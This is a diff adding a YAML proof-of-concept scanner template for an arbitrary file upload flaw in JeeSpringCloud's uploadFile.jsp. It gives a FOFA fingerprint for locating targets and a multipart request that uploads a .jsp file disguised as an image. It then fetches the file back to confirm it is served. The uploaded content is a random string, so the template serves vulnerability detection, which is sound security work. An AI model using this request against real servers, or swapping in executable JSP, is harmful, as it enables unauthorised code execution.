@@ -1,0 +1,47 @@
+id: poc-yaml-jeespringcloud-uploadfile-jsp-anyfile-upload
+info:
+  name: JeeSpringCloud uploadFile.jsp 任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: JeeSpringCloud
+  fofa: header="com.jeespring.session.id"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+  boundary: random_str(26)
+requests:
+- method: POST
+  path: /static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{.boundary}}
+  data: '------WebKitFormBoundary{{.boundary}}
+
+    Content-Disposition: form-data; name="fileshare"; filename="{{.filename}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    {{.content}}
+
+
+    ------WebKitFormBoundary{{.boundary}}--
+
+    '
+  expression: 'status_code == 200 &&
+
+    matches(body,"[0-9]+.jsp\r\n") &&
+
+    contains(headers,"text/html")
+
+    '
+  output:
+  - regex_match(body,"(?P<t1>[0-9]+).jsp\r\n")
+- method: GET
+  path: /static/uploadify/{{.t1}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
